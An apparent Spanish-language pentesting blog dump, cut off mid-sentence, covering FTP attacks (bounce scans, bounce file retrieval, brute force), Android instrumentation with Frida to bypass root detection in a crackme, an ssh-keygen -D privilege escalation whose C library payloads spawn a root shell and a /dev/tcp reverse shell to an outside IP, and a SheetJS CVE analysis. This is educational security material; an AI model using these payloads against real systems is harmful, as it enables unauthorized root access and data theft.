FTP (File Transfer Protocol) es un protocolo usado para la transferencia de archivos entre ordenadores en red, este protocolo presenta arquitectura cliente-servidor us\u00e1ndose un servidor para servir archivos que pueden ser accedidos por N clientes. Por defecto, la informaci\u00f3n se transmite en texto plano, aunque existe una versi\u00f3n cifrada del mismo llamada SFTP (Secure File Transfer Protocol).</p> <p>Si bien existen implementaciones con interfaz gr\u00e1fica, en este art\u00edculo haremos uso de la herramienta de l\u00ednea de comandos de FTP, la cual nos da bastante flexibilidad a la hora de trabajar con el protocolo. En art\u00edculos posteriores exploraremos las principales implementaciones de cliente y servidor, aunque en este nos centraremos en explicar los conceptos b\u00e1sicos del protocolo, como trabajar con \u00e9l y como aprovechar algunas malas configuraciones.</p>"},{"location":"es/blog/posts/14-11-2024/#teoria","title":"Teor\u00eda","text":""},{"location":"es/blog/posts/14-11-2024/#canales-de-comunicacion","title":"Canales de comunicaci\u00f3n","text":"<p>Para el funcionamiento de FTP se requieren de dos canales de comunicaci\u00f3n, uno para el env\u00edo de comandos y otro para los datos.</p>"},{"location":"es/blog/posts/14-11-2024/#modos-de-conexion","title":"Modos de conexi\u00f3n","text":""},{"location":"es/blog/posts/14-11-2024/#activo","title":"Activo","text":"<p>Es el modo de conexi\u00f3n predeterminado para las conexiones FTP, en \u00e9l ocurren dos eventos:</p> <ul> <li>Se establece un canal de comandos en la conexi\u00f3n con el servidor entre el puerto de comandos del servidor (21 por defecto) y un puerto superior a 1023 en el lado cliente (nos referiremos a este como P).</li> <li>Una vez establecida la conexi\u00f3n de datos se intenta abrir una conexi\u00f3n desde el puerto de datos del servidor (20 por defecto) al puerto P+1 del cliente.</li> </ul> <p>Nota</p> <p>El modo activo puede presentar problemas con los firewalls del cliente debido a que intenta crear una conexi\u00f3n directa a un puerto del lado cliente, lo cual puede ser bloqueado por ciertos firewalls.</p>"},{"location":"es/blog/posts/14-11-2024/#pasivo","title":"Pasivo","text":"<p>Este modo surge como soluci\u00f3n al problema de los firewalls del cliente, aqu\u00ed se modifica el flujo de trabajo de modo que tanto la conexi\u00f3n de datos como la conexi\u00f3n del cliente se inician desde el cliente, podemos desglosarlo en dos eventos.</p> <ul> <li>Se establece un canal de comandos en la conexi\u00f3n con el servidor entre el puerto de comandos del servidor (21 por defecto) y un puerto superior a 1023 en el lado cliente (nos referiremos a este como P).</li> <li>Una vez establecida la conexi\u00f3n de datos se abre una conexi\u00f3n de datos desde el puerto P+1 del cliente a un puerto del canal de datos del servidor, este proceso se repite para cada transferencia de archivos ocupando un puerto distinto del servidor en cada conexi\u00f3n (esto puede ser configurado en la mayor\u00eda de los software del lado servidor) .</li> </ul> <p>Nota</p> <p>El modo pasivo requiere de la apertura de un rango de puertos en el firewall, esto puede generar algunos problemas de seguridad si esta apertura de puertos no se configura de manera correcta.</p>"},{"location":"es/blog/posts/14-11-2024/#comandos-ftp","title":"Comandos FTP","text":"<pre><code>CWD  -&gt; Cambia el directorio actual por el especificado\nDELE -&gt; Elimina el archivo especificado\nEPRT -&gt; Establecer un socket para la conexi\u00f3n de datos\nLIST -&gt; Lista los archivos en el directorio actual\nPASV -&gt; Cambia el modo a pasivo\nPWD  -&gt; Muestra el directorio actual \nRETR -&gt; Descarga el archivo especificado\n</code></pre>"},{"location":"es/blog/posts/14-11-2024/#anonymous-login","title":"Anonymous login","text":"<p>Existe una configuraci\u00f3n de FTP que permite el uso de un login para compartir ficheros para cualquier usuario que lo requiera, en caso de que esta configuraci\u00f3n este habilitada un usuario podr\u00eda usar anonymous como nombre de inicio de sesi\u00f3n y cualquier contrase\u00f1a acceder al servidor como un usuario con bajos privilegios, aunque en ciertos casos esto puede llevar a comprometer el sistema entero.</p>"},{"location":"es/blog/posts/14-11-2024/#ftp-bounce-port-scan","title":"FTP Bounce port scan","text":"<p>Es posible abusar de los comandos PORT y ERPT para realizar un escaneo de puertos abiertos mediante un servidor FTP.</p>"},{"location":"es/blog/posts/14-11-2024/#hand-made","title":"Hand-made","text":"<p>Una vez conectado podemos realizar el escaneo de puertos mediante los comandos PORT y ERPT seguidos de un comando LIST .</p> <p>Aqu\u00ed tenemos un ejemplo para escanear el puerto 9091 del host 10.10.10.14</p> <pre><code>PORT 10,10,10,14,0,9091\nEPRT |2|10.10.10.14|9091|\n\nLIST\n</code></pre> <p>Si la respuesta es un 150 el puerto est\u00e1 abierto, en caso de recibir un 415 el puerto est\u00e1 cerrado.</p>"},{"location":"es/blog/posts/14-11-2024/#ftp-bounce-file-get","title":"FTP Bounce file get","text":"<p>Este ataque permite a un atacante descargar ficheros de un servidor FTP no accesible por el atacante, pero al que s\u00ed puede llegar un servidor FTP accesible por el atacante</p> <p></p> <p>Este ataque tiene los siguientes prerequisitos:</p> <ul> <li>Credenciales v\u00e1lidas para External FTP.</li> <li>Credenciales v\u00e1lidas para Internal FTP.</li> <li>Acceso de escritura para External FTP.</li> <li>Permisos de ejecuci\u00f3n del comando PORT tanto en External como en Internal.</li> </ul> <p>Primero que nada desplegaremos un servidor FTP en la m\u00e1quina del atacante, este servidor tiene que soportar el modo pasivo.</p> <p>Una vez desplegado abriremos una conexi\u00f3n pasiva con el comando PASV y le diremos que la guarde con STOR output.ext .</p> <p>Ahora crearemos un archivo con los comandos que queremos lanzar contra el segundo servidor, un ejemplo seria el siguiente:</p> <pre><code>user ftp   # Usuario para el servidor internal\npass password # Password para el servidor internal\ncwd /DIRECTORY\ntype i\nport F,F,F,F,X,X  #Nuestro puerto pasivo\nretr file.ext\nquit\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n</code></pre> <p>Ahora lo subimos con PUT y desde el servidor externo ejecutamos los siguientes comandos:</p> <pre><code>put payload\nquote \"port C,C,C,C,0,21\" # IP del servidor interno\nquote \"retr payload\"\n</code></pre> <p>Tras esto tendremos el archivo file.ext en nuestro servidor como output.ext</p>"},{"location":"es/blog/posts/14-11-2024/#ataque-por-fuerza-bruta","title":"Ataque por fuerza bruta","text":"<p>Muchos de los servidores FTP no presentan protecci\u00f3n contra ataques por fuerza bruta. Teniendo un usuario o una lista de ellos podemos llevar a cabo un ataque de fuerza bruta con diferentes credenciales obtenidas de diversas fuentes, si bien existen varias herramientas para este fin, las dos m\u00e1s comunes son NetExec e Hydra. </p>"},{"location":"es/blog/posts/14-11-2024/#backup-sorpresa","title":"Backup sorpresa","text":"<p>Esto no es un ataque per se, pero es bastante \u00fatil, ya que nos permite descargar todos los archivos accesibles del servidor mediante un solo comando.</p> <pre><code>wget -r ftp://IP/dir/* --ftp-user=username --ftp-password=password\n</code></pre>"},{"location":"es/blog/posts/14-11-2024/#ftp-file-upload-to-rce","title":"FTP file upload to RCE","text":"<p>En determinadas circunstancias, el permiso para subir ficheros al servidor junto a otras malas configuraciones puede llevar a la obtenci\u00f3n de ejecuci\u00f3n remota de comandos en el servidor.</p> <p>El caso m\u00e1s com\u00fan es la posibilidad de subir ficheros que van a ser luego servidos por un servidor web, donde podr\u00edamos subir una webshell interpretable por el servidor para lograr obtener ejecuci\u00f3n de comandos.</p>"},{"location":"es/blog/posts/14-11-2024/#sniffing-credentials","title":"Sniffing credentials","text":"<p>Dado que FTP funciona por defecto en texto plano, es posible para un atacante en la misma red usar un sniffer y capturar tanto las credenciales como la conversaci\u00f3n FTP.</p> <p>En el pr\u00f3ximo art\u00edculo de esta serie sobre FTP hablaremos sobre fallos comunes de implementaci\u00f3n y algunas vulnerabilidades conocidas de algunas implementaciones del protocolo.</p>"},{"location":"es/blog/posts/15-12-2024/","title":"Instalaci\u00f3n y Configuraci\u00f3n de Herramientas de An\u00e1lisis en Android","text":"<p>Este art\u00edculo describe los pasos necesarios para crear un entorno de pruebas din\u00e1mico en Linux/Debian, detallando c\u00f3mo integrar herramientas como Burp Suite, Frida y Objection, y sus prop\u00f3sitos espec\u00edficos. Tambi\u00e9n cubre procedimientos para gestionar certificados en un emulador de Android y configurar un entorno de pruebas din\u00e1mico. Sigue las instrucciones detalladas para lograr una configuraci\u00f3n funcional y lista para el an\u00e1lisis.</p>"},{"location":"es/blog/posts/15-12-2024/#instalar-de-android-studio","title":"Instalar de Android Studio","text":"<p>Android Studio sirve como el IDE principal para el desarrollo y pruebas de aplicaciones Android, ofrece un entorno para la creaci\u00f3n, emulaci\u00f3n y depuraci\u00f3n de aplicaciones, vamos a utilizar esto para una f\u00e1cil descarga e instalaci\u00f3n de avds.</p>"},{"location":"es/blog/posts/15-12-2024/#paso-1-descargar-android-studio","title":"Paso 1: Descargar Android Studio","text":"<ol> <li>Descarga el archivo ZIP de Android Studio desde la web oficial Android Studio.</li> </ol>"},{"location":"es/blog/posts/15-12-2024/#paso-2-extraccion-y-configuracion","title":"Paso 2: Extracci\u00f3n y Configuraci\u00f3n","text":"<p>Extrae el archivo descargado:</p> <pre><code>unzip android-studio-*.zip -d ~/android-studio\n</code></pre>"},{"location":"es/blog/posts/15-12-2024/#paso-3-crear-enlaces-simbolicos","title":"Paso 3: Crear Enlaces Simb\u00f3licos","text":"<p>Para agilizar el uso de Android Studio y del emulador, creamos los enlaces simb\u00f3licos:</p> <pre><code>sudo ln -s ~/android-studio/bin/studio.sh /usr/local/bin/androidStudio\nsudo ln -s ~/android-studio/emulator/emulator /usr/local/bin/androidEmulator\n</code></pre> <p>Ahora, puedes ejecutar Android Studio con:</p> <pre><code>androidStudio\n</code></pre> <p>And the emulator with:</p> <pre><code>androidEmulator\n</code></pre>"},{"location":"es/blog/posts/15-12-2024/#paso-4-usar-un-dispositivo-fisico-opcional","title":"Paso 4: Usar un dispositivo f\u00edsico (Opcional)","text":"<p>Aunque esta gu\u00eda una principalmente un emulador de Android, puedes optar por utilizar un dispositivo f\u00edsico para una experiencia m\u00e1s realista. Esto requiere habilitar las opciones de desarrollador y usar la depuraci\u00f3n USB en tu dispositivo:</p> <ol> <li>Habilita Opciones de Desarrollador:</li> <li> <p>Ve a Ajustes &gt; Acerca del tel\u00e9fono y pincha el N\u00famero de compilaci\u00f3n varias veces hasta que se activen las opciones de desarrollador.</p> </li> <li> <p>Habilita la Depuraci\u00f3n USB:</p> </li> <li>En Ajustes &gt; Opciones Desarrollador, habilita Depuraci\u00f3n USB.</li> </ol> <p>Conecta tu dispositivo al ordenador a trav\u00e9s del puerto USB. Ahora puedes utilizar los comandos <code>abd</code> para instalar, depurar aplicaciones y realizar las mismas pruebas en que con el emulador.</p>"},{"location":"es/blog/posts/15-12-2024/#instalar-certificados-burp-en-un-emulador-android","title":"Instalar  Certificados Burp en un Emulador Android","text":"<p>Burp Suite es utilizado para interceptar y analizar el tr\u00e1fico entre aplicaciones Android y los servidores backend. Instalar estos certificados nos permitir\u00e1 descifrar el tr\u00e1fico HTTPS para analizarlo.</p>"},{"location":"es/blog/posts/15-12-2024/#paso-1-inicia-el-emulador-con-un-sistema-escribible","title":"Paso 1: Inicia el Emulador con un Sistema Escribible","text":"<ol> <li>Lista los AVDs (Android Virtual Devices) con la opci\u00f3n <code>-list-avds</code>: <pre><code>androidEmulator -list-avds\n</code></pre></li> <li>Inicia el emulador con la opci\u00f3n <code>-writable-system</code>: <pre><code>androidEmulator -avd &lt;avd_name&gt; -writable-system\n</code></pre></li> </ol>"},{"location":"es/blog/posts/15-12-2024/#paso-2-exporta-el-certificado-desde-burp-suite","title":"Paso 2: Exporta el Certificado desde Burp Suite","text":"<ol> <li>Desde Burp Suite, exporta el certificado en formado DER:</li> <li>Ve a Proxy &gt; Opciones &gt; Import/Export CA certificate.</li> <li>Exporta el archivo como <code>burp-cert.der</code>.</li> </ol>"},{"location":"es/blog/posts/15-12-2024/#paso-3-convierte-y-copia-el-certificado-en-el-emulador","title":"Paso 3: Convierte y Copia el Certificado en el Emulador","text":"<ol> <li> <p>Convierte el certificado DER al formato PEM: <pre><code>openssl x509 -inform DER -in burp-cert.der -out burp-cert.pem\n</code></pre></p> </li> <li> <p>Obt\u00e9n el hash del certificado: <pre><code>openssl x509 -inform PEM -subject_hash_old -in burp-cert.pem | head -1\n</code></pre></p> </li> <li> <p>Renombra el certificado usando su hash: <pre><code>mv burp-cert.pem 9a5ba575.0\n</code></pre></p> </li> <li> <p>Env\u00eda el certificado al emulador: <pre><code>adb root\nadb remount\nadb push 9a5ba575.0 /sdcard/\nadb shell mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0\n</code></pre></p> </li> </ol>"},{"location":"es/blog/posts/15-12-2024/#paso-4-verificacion","title":"Paso 4: Verificaci\u00f3n","text":"<p>Reinicia el emulador y verifica la instalaci\u00f3n comprobando Ajustes &gt; Seguridad &gt; Credenciales de confianza para el certificado \"PortSwigger CA\".</p>"},{"location":"es/blog/posts/15-12-2024/#instalar-frida-y-objection-en-un-entorno-virtual-en-python","title":"Instalar Frida y Objection en un Entorno Virtual en Python","text":"<p>Frida es un conjunto de herramientas de instrumentaci\u00f3n din\u00e1mica para la depuraci\u00f3n, pruebas e ingenier\u00eda inversa para aplicaciones Android. Objection es una envoltura para Frida que simplifica la evaluaci\u00f3n de seguridad automatizando tareas de pruebas comunes.</p>"},{"location":"es/blog/posts/15-12-2024/#paso-1-creamos-un-entorno-virtual","title":"Paso 1: Creamos un Entorno Virtual","text":"<ol> <li> <p>Creamos un Entorno Virtual en Python para aislar las dependencias de la herramienta: <pre><code>python3 -m venv frida-env\n</code></pre></p> </li> <li> <p>Activamos el entorno virtual: <pre><code>source frida-env/bin/activate\n</code></pre></p> </li> </ol>"},{"location":"es/blog/posts/15-12-2024/#paso-2-instalamos-frida-y-objection","title":"Paso 2: Instalamos Frida y Objection","text":"<ol> <li>Instalamos ambas aplicaciones con <code>pip</code>: <pre><code>pip install frida-tools objection\n</code></pre></li> </ol>"},{"location":"es/blog/posts/15-12-2024/#configurando-frida-server-en-el-emulador","title":"Configurando Frida-Server en el Emulador","text":"<p>El Servidor Frida facilita la comunicaci\u00f3n entre el cliente Frida de su m\u00e1quina host y el emulador Android para la instrumentaci\u00f3n de aplicaciones.</p>"},{"location":"es/blog/posts/15-12-2024/#paso-1-descargamos-el-archivo-frida-server","title":"Paso 1: Descargamos el archivo Frida-Server","text":"<ol> <li> <p>Descarga el binario <code>frida-server</code> desde la web oficial de Frida</p> </li> <li> <p>Extrae el archivo descargado.</p> </li> </ol>"},{"location":"es/blog/posts/15-12-2024/#paso-2-sube-y-configura-frida-server-en-el-emulador","title":"Paso 2: Sube y Configura Frida-Server en el Emulador","text":"<ol> <li>Sube el binario <code>frida-server</code> al emulador: <pre><code>adb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\n</code></pre></li> <li>Inicia el servidor Frida: <pre><code>adb shell /data/local/tmp/frida-server &amp;\n</code></pre></li> </ol>"},{"location":"es/blog/posts/15-12-2024/#paso-3-verificacion","title":"Paso 3: Verificaci\u00f3n","text":"<p>Garantiza que Frida est\u00e1 funcionando listando los procesos del emulador:</p> <pre><code>frida-ps -U\n</code></pre>"},{"location":"es/blog/posts/15-12-2024/#inspeccion-de-metodos-revisiting-crackme-1","title":"Inspecci\u00f3n de M\u00e9todos: Revisiting Crackme 1","text":"<p>Para demostrar el poder del an\u00e1lisis din\u00e1mico, utilizaremos la APK \"Uncrackable1\" para explorar c\u00f3mo estas t\u00e9cnicas pueden ser aplicadas en esta pr\u00e1ctica.</p>"},{"location":"es/blog/posts/15-12-2024/#explorando-la-aplicacion-con-apklab","title":"Explorando la Aplicaci\u00f3n con APKLab","text":"<p>Para entender mejor la aplicaci\u00f3n, decompile el APK para mostrar su c\u00f3digo fuente Java utilizando la extensi\u00f3n APKLab de Visual Studio Code. Esta extensi\u00f3n integra herramientas como JADX para simplificar el proceso.</p>"},{"location":"es/blog/posts/15-12-2024/#paso-1-configurar-apklab","title":"Paso 1: Configurar APKLab","text":"<ol> <li>Instala APKLab desde el mercado de extensiones de Visual Studio Code.</li> <li>Abre el archivo APK en APKLab para descompilar autom\u00e1ticamente la aplicaci\u00f3n y mostrar el c\u00f3digo.</li> </ol> Extensi\u00f3n APK Lab para Visual Studio Code"},{"location":"es/blog/posts/15-12-2024/#paso-2-localizar-el-codigo-de-deteccion-desde-la-raiz","title":"Paso 2: Localizar el c\u00f3digo de detecci\u00f3n desde la ra\u00edz","text":"<ol> <li> <p>Usa la funcionalidad de buscar en APKLab para localizar el c\u00f3digo responsable de la detecci\u00f3n de la ra\u00edz mediante la b\u00fasqueda de frases como \"Root detected\".</p> </li> <li> <p>Navega por la implementaci\u00f3n pulsando en los resultados buscados.</p> </li> </ol>"},{"location":"es/blog/posts/15-12-2024/#eludir-la-deteccion-root","title":"Eludir la Detecci\u00f3n Root","text":"<p>Podemos eludir la detecci\u00f3n root modificando lo que devuelve los m\u00e9todos como <code>c.a()</code>, <code>c.b()</code>, y <code>c.c()</code>. Alternativamente, podemos cambiar la implementaci\u00f3n del m\u00e9todo <code>onClick()</code> en <code>MainActivity</code>, que cierra la aplicaci\u00f3n cuando pulsamos \"OK\" en una alerta.</p>"},{"location":"es/blog/posts/15-12-2024/#usando-frida-para-la-instrumentacion-de-la-aplicacion","title":"Usando Frida para la Instrumentaci\u00f3n de la Aplicaci\u00f3n","text":""},{"location":"es/blog/posts/15-12-2024/#paso-1-buscamos-el-id-del-proceso-de-frida","title":"Paso 1: Buscamos el ID del proceso de Frida","text":"<p>Listamos los procesos para localizar la aplicaci\u00f3n:</p> <pre><code>frida-ps -Ua\n</code></pre>"},{"location":"es/blog/posts/15-12-2024/#paso-2-adjuntamos-el-proceso-y-enumeramos-los-metodos","title":"Paso 2: Adjuntamos el Proceso y Enumeramos los m\u00e9todos","text":"<p>Creamos un script para listar los m\u00e9todos de la aplicaci\u00f3n: <pre><code>// listmethods.js\nJava.perform(() =&gt; {\n  const groups = Java.enumerateMethods(\"*MainActivity*!onCl*\");\n  console.log(JSON.stringify(groups, null, 2));\n});\n</code></pre> Adjuntamos el proceso y ejecutamos el script:</p> <pre><code>frida -U &lt;PID&gt; -l listmethods.js\n</code></pre>"},{"location":"es/blog/posts/15-12-2024/#paso-3-modificacion-de-la-implementacion-del-metodo","title":"Paso 3: Modificaci\u00f3n de la Implementaci\u00f3n del m\u00e9todo","text":"<p>Usa Frida para modificar el m\u00e9todo <code>onClick()</code>: <pre><code>// override.js\nJava.perform(() =&gt; {\n  const main = Java.use('sg.vantagepoint.uncrackable1.MainActivity$1');\n  main.onClick.implementation = function () {\n    console.log('Pwned!');\n  };\n});\n</code></pre></p> <p>Ejecuta el script y verifica que presionando \"OK\" la aplicaci\u00f3n no se cierra.</p>"},{"location":"es/blog/posts/15-12-2024/#extraccion-de-la-passphrase-secreta","title":"Extracci\u00f3n de la passphrase secreta","text":"<p>Inspecciona el c\u00f3digo m\u00e1s a fondo para buscar la funci\u00f3n responsable de descifrar la frase de contrase\u00f1a (passphrase) secreta. Registra la salida del descifrado utilizando Frida:</p> <pre><code>// logDecryptor.js\nJava.perform(() =&gt; {\n  const AESDecryptor = Java.use(\"sg.vantagepoint.a.a\");\n  AESDecryptor[\"a\"].implementation = function (bArr, bArr2) {\n    console.log(`AESDecryptor.decrypt is called: bArr=${bArr}, bArr2=${bArr2}`);\n    const result = this[\"a\"](bArr, bArr2);\n    console.log(`AESDecryptor.decrypt result=${result}`);\n    return result;\n  };\n});\n</code></pre> <p>Convierte la matriz de bytes de salida en una string utilizando Python para revelar la frase secreta.</p> <p>Con esta configuraci\u00f3n, Android Studio permite la emulaci\u00f3n y depuraci\u00f3n de aplicaciones, Burp Suite facilita la interceptaci\u00f3n y el an\u00e1lisis del tr\u00e1fico, Frida permite la instrumentaci\u00f3n din\u00e1mica de la aplicaci\u00f3n, y Objection automatiza tareas comunes de pruebas de seguridad. La secci\u00f3n a\u00f1adida de an\u00e1lisis din\u00e1mico demuestra la aplicaci\u00f3n pr\u00e1ctica de estas herramientas para extraer secretos y eludir protecciones, lo que convierte esta gu\u00eda en un recurso completo para las pruebas de seguridad de aplicaciones m\u00f3viles.</p>"},{"location":"es/blog/posts/17-10-2024/","title":"Abusando de ssh-keygen","text":"<p>SSH-Keygen es una herramienta que permite crear y gestionar claves SSH, esta herramienta esta presente en la mayor\u00eda de los sistemas UNIX hoy en d\u00eda como herramienta para facilitar la gesti\u00f3n de las claves SSH.</p> <p>En este articulo exploraremos un par de m\u00e9todos para abusar de esta herramienta con ciertas configuraciones como m\u00e9todo de persistencia o de escalada de privilegios en el sistema.</p> <p>En concreto abusaremos de una funcionalidad concreta de este binario que permite la carga de claves publicas desde una librer\u00eda de lectura de tarjetas, esta opci\u00f3n es el par\u00e1metro -D, su uso es el siguiente.</p> <pre><code>ssh-keygen -D ./lib.so\n</code></pre>"},{"location":"es/blog/posts/17-10-2024/#como-generamos-el-payload","title":"Como generamos el payload","text":"<p>Una vez explicado que nos lleva a poder explotar esta funci\u00f3n, vamos a explicar en mayor detalle como generar un payload cargable, para ello primero de todo ser\u00e1 obtener una versi\u00f3n de pkcs11.h . En este archivo de cabeceras es donde se definen los tipos de datos necesarios para la funci\u00f3n de nuestra librer\u00eda que llamara ssh-keygen al usar el par\u00e1metro -D. </p> <p>En nuestro caso, para ello iremos al repositorio de Open Smart Card y descargaremos la versi\u00f3n que necesitamos de la siguiente url:</p> <p>https://github.com/OpenSC/libp11/blob/master/src/pkcs11.h</p> <p>Con este archivo procederemos a escribir un peque\u00f1o programa en C con la estructura necesaria para ser ejecutado por ssh-keygen, en nuestro caso este programa spwanea una shell en bash.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Una vez compilado podemos cargarlo como librer\u00eda como indicamos en la introducci\u00f3n. </p>"},{"location":"es/blog/posts/17-10-2024/#caso-1-sudo-ssh-keygen","title":"Caso 1: Sudo SSH-Keygen","text":"<p>Vamos a explotar un escenario donde nuestro usuario tiene permisos para ejecutar el comando ssh-keygen como root.</p> <pre><code>Matching Defaults entries for pnavas on test:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser pnavas may run the following commands on permx:\n    (ALL : ALL) NOPASSWD: /usr/bin/ssh-keygen\n</code></pre> <p>En este ese caso, en lugar de hacer uso de una simple llamada a bash vamos a cargar una reverse shell.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, \"-c\" , \"bash -i &gt;&amp; /dev/tcp/192.168.10.30/9001 0&gt;&amp;1\", NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Como resultado, al cargarla obtendremos una conexi\u00f3n como root en nuestro listener, podr\u00edamos cambiarlo para ejecutar una shell sencillamente como en el ejemplo de la secci\u00f3n de teor\u00eda </p>"},{"location":"es/blog/posts/17-10-2024/#caso-2-ssh-keygen-suid","title":"Caso 2: SSH-Keygen SUID","text":"<p>En este escenario vamos a explotar un escenario algo menos com\u00fan donde ssh-keygen tiene el bit del SUID activado, en este caso para mantener los privilegios del SUID tenemos que cambiar un poco el c\u00f3digo de la librer\u00eda para que la shell mantenga los privilegios</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, \"-p\", NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Una vez compilado podemos ejecutar el comando para cargar la librer\u00eda y obtener una shell con los privilegios necesarios</p>"},{"location":"es/blog/posts/19-01-2025/","title":"El d\u00eda que Dependabot conoci\u00f3 a SheetJS","text":"<p>Todo comenz\u00f3 con una notificaci\u00f3n de Dependabot hace unos d\u00edas. Mientras revisaba un repositorio de un proyecto interno, me encontr\u00e9 con el siguiente mensaje:</p> Alerta de Dependabot <p>Proced\u00ed con el flujo de trabajo est\u00e1ndar de Dependabot para abordar los problemas, ya que asum\u00ed que era una actualizaci\u00f3n de rutina. Sin embargo, me sorprendi\u00f3 cuando las correcciones para ambas vulnerabilidades fallaron porque no se pudo encontrar la versi\u00f3n parcheada requerida.</p> Alerta de Dependabot por DoS en SheetJS Alerta de Dependabot por Prototype Pollution en SheetJS <p>Despu\u00e9s de algunas investigaciones, descubr\u00ed un conflicto en curso entre npm y los desarrolladores de xlsx, debido a un problema con el token de la Autenticaci\u00f3n Multi Factor (MFA) de hace unos a\u00f1os. Como resultado, xlsx ha abandonado el ecosistema npm y ahora publica sus paquetes a trav\u00e9s de otra Redes de Distribuci\u00f3n de Contenidos (CDN) para la distribuci\u00f3n de sus paquetes. Esto ha introducido un nuevo nivel de complejidad, haciendo m\u00e1s dif\u00edcil para los usuarios de npm actualizar los paquetes y resolver vulnerabilidades de forma efectiva.</p> <p>Dado que nuestra aplicaci\u00f3n se vio afectada por estas vulnerabilidades, decid\u00ed profundizar en ellas para evaluar el riesgo de retrasar el parche y explorar posibles soluciones si fuera necesario, y tambi\u00e9n fue una buena excusa para escribir un art\u00edculo para el blog, un art\u00edculo que seguro puede ayudar a m\u00e1s de un desarrollador a decidir c\u00f3mo afrontar la misma situaci\u00f3n en SheetJS o xlsx. Con esto en mente, analicemos las dos vulnerabilidades reportadas por el dependantbot con m\u00e1s detalle:</p>"},{"location":"es/blog/posts/19-01-2025/#prototype-pollution-en-sheetjs-aka-cve-2023-30533","title":"Prototype Pollution en SheetJS aka CVE-2023-30533","text":"<p>Esta vulnerabilidad en SheetJs permite a un atacante subir creado especialmente para corromper los prototipos existentes de los objetos en la aplicaci\u00f3n. Prototype Pollution podr\u00eda conducir potencialmente a problemas serios como Ejecuci\u00f3n Remota de Comandos (RCE), Cross-Site Scripting (XSS) o Denegaciones de Servicios (DoS). Dependiendo del contexto, se trata de una amenaza importante.</p> <p>Indagando, encontr\u00e9 un art\u00edculo escrito por un investigador de Solid Labs que descubri\u00f3 la vulnerabilidad. Aunque este art\u00edculo est\u00e1 en ruso y parcialmente detr\u00e1s de un paywall, da alguna idea del contexto y el impacto de la vulnerabilidad. Por un lado el riesgo parece ser limitado, por el otro confirma que XSS se puede lograr con esta vulnerabilidad, aunque la prueba de concepto para el XSS est\u00e1 detr\u00e1s del paywall.</p> <p>Utilizando la parte gratuita disponible del art\u00edculo, pude crear un PoC b\u00e1sico para prototype pollution con un impacto limitado. Esto nos permite probar si nuestra aplicaci\u00f3n era vulnerable e implementar un parche espec\u00edfico para sanear el vector de ataque mientras que preparamos una actualizaci\u00f3n completa. Tambi\u00e9n utilizamos el PoC y revisando el commit que parcheaba esta vulnerabilidad, encontr\u00e9 que la vulnerabilidad ocurr\u00eda al importar una hoja con comentarios. La causa parece ser que los desarrolladores no previeron que las referencias a celdas pod\u00edan ser manipuladas por un atacante. Su soluci\u00f3n final fue validar que la referencia a las celdas fuera leg\u00edtimas.</p> <p>Sabiendo esto, podemos crear un parche local para la versi\u00f3n de nuestra biblioteca, pero habiendo trabajado como pentester varios a\u00f1os, ten\u00eda curiosidad de c\u00f3mo escalaba de prototype pollution a XSS. Revisar el parche fue clave para encontrar el vector XXS:</p> Commit que soluciona el XSS <p>Podemos ver que los desarrolladores a\u00f1adieron escapehtml a una l\u00ednea en el mismo commit que corrige la vulnerabilidad. Rastreando el c\u00f3digo hacia atr\u00e1s, podemos ver que la l\u00ednea corregida s\u00f3lo se ejecutaba cuando la biblioteca se usaba para parsear el XLS a HTML utilizando la funci\u00f3n make_html_row. En nuestro caso, como no utilizamos parsing HTML en nuestra aplicaci\u00f3n, esta vulnerabilidad no es cr\u00edtica, ya que no utilizamos la funci\u00f3n vulnerable. Sin embargo, hemos aplicado los dos parches localmente para mejorar la seguridad mientras que preparamos el actualizaci\u00f3n completa.</p> <p>Sabiendo esto, desarrolla un exploit para generar XLSX malicioso con un payload XSS es bastante sencillo. Sin embargo, para no facilitar la explotaci\u00f3n publicando un PoC para una vulnerabilidad dif\u00edcil de mitigar, no publicar\u00e9 un PoC funcional para explotar este XSS en un paquete que recibe 2,5 millones de descargas semanalmente.</p>"},{"location":"es/blog/posts/19-01-2025/#sheetjs-denegacion-de-servicio-por-expresiones-regulares-redos-cve-2024-22363","title":"SheetJS Denegaci\u00f3n de Servicio por Expresiones Regulares (ReDoS) (CVE-2024-22363)","text":"<p>Esta vulnerabilidad permite a un atacante subir una archivo que cause un retraso significativo en una aplicaci\u00f3n explotando defectos en expresiones regulares en SheetJS. Aunque no es cr\u00edtica para nuestra aplicaci\u00f3n, me interesa replicar el problema y crear un parche virtual temporal hasta que la actualizaci\u00f3n 